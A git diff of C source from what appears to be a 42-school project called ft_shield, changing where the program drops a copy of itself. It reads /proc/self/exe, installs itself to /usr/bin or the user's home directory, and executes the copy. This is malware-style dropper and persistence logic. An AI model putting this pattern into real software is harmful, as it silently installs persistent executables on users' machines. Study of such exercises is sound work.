@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/04 09:40:32 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/04 10:19:31 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,6 +28,17 @@ int	ctx_loop(t_ctx *ctx)
 	return (1);
 }
 
+static char	*get_non_root_path()
+{
+	char	*home_path = getenv("HOME");
+	if (!home_path)
+		return (NULL);
+	char	*executable_path = strjoin(home_path, "/binft_shield");
+	if (!executable_path)
+		return (NULL);
+	return (executable_path);
+}
+
 static void	handle_payload(bool root, char **envp)
 {
 	char	*payload_path;
@@ -36,7 +47,11 @@ static void	handle_payload(bool root, char **envp)
 	if (root)
 		payload_path = "/usr/bin/ft_shield";
 	else
-		payload_path = "/tmp/binft_shield";
+	{
+		payload_path = get_non_root_path();
+		if (!payload_path)
+			return ;
+	}
 
 	readlink("/proc/self/exe", exec_path, sizeof(exec_path));
 
@@ -45,6 +60,8 @@ static void	handle_payload(bool root, char **envp)
 		export_payload(root, exec_path, payload_path);
 		exec_payload(payload_path, envp);
 	}
+	if (!root)
+		free(payload_path);
 }
 
 int	main(int ac, char **av, char **envp)
